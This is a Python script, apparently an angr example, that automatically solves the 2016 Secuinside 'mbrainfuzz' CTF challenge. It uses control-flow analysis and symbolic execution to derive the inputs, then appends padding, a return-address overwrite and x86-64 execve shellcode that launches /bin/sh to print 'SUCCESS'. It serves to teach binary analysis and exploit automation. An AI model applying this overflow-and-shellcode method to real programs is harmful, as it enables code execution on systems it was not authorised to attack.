#This example is for secuinsides mbrainfuzz challenge (2016)
#The challenge gave you binaries which you automatically had to exploit - since the service is not online anymore, 4 example binaries, obtained during the ctf, are included in this example 
#The script is based on the writeup at https://tasteless.eu/post/2016/07/secuinside-mbrainfuzz/ - the difference is that the static analyses part is done with angr instead of r2


import angr, claripy, re, sys, struct, subprocess

def static_analyses(p):
    print '[*] Analyzing %s...' % p.filename

    #This part is done with r2 in the original writeup.
    #However, it is also possible to do the same with angr! :)
        
    to_find, to_avoid, byte_addresses = [], [], []
    find_hex_re = re.compile('(0x[0-9a-fA-F]{6})')

    #Our main interface for this part will be the cfg. For performance reasons, we use CFGFast 
    cfg = p.analyses.CFGFast()

    #As the main function doesn't get identified automatically, let's use a small trick here: 
    #We take a function which is only called in main (e.g. sscanf) and resolve its predecessor
    for address,function in cfg.function_manager.functions.iteritems():
        if function.name == 'plt.__isoc99_sscanf':
            addr = cfg.function_manager.interfunction_graph.predecessors(address)[0]
            break

    #Now, let's go down all the way to the target function
    while(True):
        
        function = cfg.function_manager.function(addr)

        #First, let's get all call_sites and leave the loop, if there are none
        call_sites = function.get_call_sites()
        if not len(call_sites):
            break

        #Now, Let's get the address of the basic block calling the next target function.
        #The sorting and indexing is only relevant for the main function.
        calling_block_addr = sorted(call_sites)[-1]

        #Resolve the target addr
        addr = function.get_call_target(calling_block_addr)

        #Since we are already on it, let's apply a dirty heuristic to populate the to_avoid list
        #This works because the returning block from the function is at a fixed offset after the call
        #We could also develop a cleaner solution if we wouldn't use CFGFast() - but this would slow us down
        avoid = function.get_call_return(calling_block_addr) + 3

        #Last but not least, let's get the addresses of the processed bytes
        calling_block = p.factory.block(calling_block_addr)
        local_addresses = []
        for ins in calling_block.capstone.insns:
            m = re.search(find_hex_re,ins.op_str)
            if ins.insn_name() == 'movzx' and m:
                #The bytes are fetched via rip-relative addressing
                local_addresses.append(int(m.group(),16) + ins.size + ins.address)


        to_find.append(addr)
        to_avoid.append(avoid)
        byte_addresses.append(local_addresses)

    return to_find, to_avoid, byte_addresses


def generate_input(p, to_find, to_avoid, byte_addresses):
    print '[*] Generating input ....'

    input = {}

    for i in range(0,len(to_find)-1):
        f = to_find[i]
        t = to_find[i+1]

        #Set up the state for the function we want to solve
        e = p.factory.entry_state(addr=f)
        rdi = claripy.BVS('rdi', 64)
        rsi = claripy.BVS('rsi', 64)
        rdx = claripy.BVS('rdx', 64)
        rcx = claripy.BVS('rcx', 64)
        e.regs.rdi = rdi
        e.regs.rsi = rsi
        e.regs.rdx = rdx
        e.regs.rcx = rcx

        #Generate a path_group out of this state and explore
        pg = p.factory.path_group(e)
        pg.explore(find=t,avoid=to_avoid)

        #Save the solutions
        found = pg.found[0]
        address_local = byte_addresses[i]
        input[address_local[3]] = found.state.se.any_int(rdi)
        input[address_local[2]] = found.state.se.any_int(rsi)
        input[address_local[1]] = found.state.se.any_int(rdx)
        input[address_local[0]] = found.state.se.any_int(rcx)

    return input

def format_input(input):
    res = ''
    for i in input:
        res += "%02x" % input[i]
    return res


def generate_exploit(input):
    print '[*] Crafting final exploit'


    #In essence, the magic consists of:
    #   - static padding between input and the memcpy'ed buffer
    #   - padding from start of this buffer up to the location of the saved return address
    #   - the address of the shellcode
    #   - customized shellcode for '/bin/sh -c "echo SUCCESS"'
    #For more details of the magic, please check the writeup linked above
    magic = '424242424242424242424141414141414141414141414141414141414141414141412e626000000000006563686f20275355434345535327004141414141414141414141414141414141414141414141414141414141414141412f62696e2f7368002d630000000000004831c050b8ee61600050b82662600050b81e626000504889e64889c74831d2b83b0000000f05'
    exploit = input + magic
    return exploit


def main(binary):
    p = angr.Project(binary)

    (to_find, to_avoid, byte_addresses) = static_analyses(p)
    input = generate_input(p, to_find, to_avoid, byte_addresses)
    exploit = generate_exploit(format_input(input))
    print '[+] Exploit generated!'
    print '[!] Please run `%s %s`' % (binary,exploit)
    return exploit

def test():
    binaries = ['./sample_1','./sample_2','./sample_3','./sample_4']

    for b in binaries:
        p = main(b)
        assert subprocess.check_output([b,p]) == 'SUCCESS\n'

if __name__ == '__main__':
    main(sys.argv[1])
